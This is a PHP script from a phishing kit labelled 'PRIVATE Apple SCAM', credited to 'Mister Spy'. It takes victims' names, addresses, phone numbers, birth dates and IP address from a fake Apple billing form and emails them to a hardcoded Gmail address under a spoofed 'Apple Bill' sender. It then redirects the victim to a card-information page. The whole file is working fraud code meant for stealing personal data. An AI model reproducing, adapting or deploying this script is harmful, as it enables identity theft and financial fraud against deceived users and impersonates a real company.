<?php

/*
╔═══════════════════════════════════╗
╠═════ PRIVATE Apple SCAM ══════════╣
╠══════ BY Mister Spy  Tn       ════╣
╚═══════════════════════════════════╝
http://www.facebook.com/tazspy
*/

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "=========[Priv8 Apple Scama By Mister Spy]====================\n";
$message .= "First Name  : ".$_POST['spy-name']."\n";
$message .= "Last Name  : ".$_POST['spy-last']."\n";
$message .= "Country  : ".$_POST['spy-country']."\n";
$message .= "Address Line 1  : ".$_POST['Spy-add']."\n";
$message .= "City  : ".$_POST['spy-city']."\n";
$message .= "State  : ".$_POST['spy-state']."\n";
$message .= "Zip Code  : ".$_POST['spy-zip']."\n";
$message .= "Phone Number  : ".$_POST['spy-phone']."\n";
$message .= "Day  : ".$_POST['spy-day']."\n";
$message .= "MM  : ".$_POST['Spy-month']."\n";
$message .= "Year  : ".$_POST['spy-year']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[Priv8 Apple Scama By Mister Spy]=========\n";


$to = "mo3tazcoder@gmail.com";
$subject = "Priv8 By 2015 {Spy} Bill [$ip]";
$headers = "From: Apple Bill <mrspy@codex.com>";

mail($to, $subject, $message,$headers);
header("Location:CardInfo.html");


?>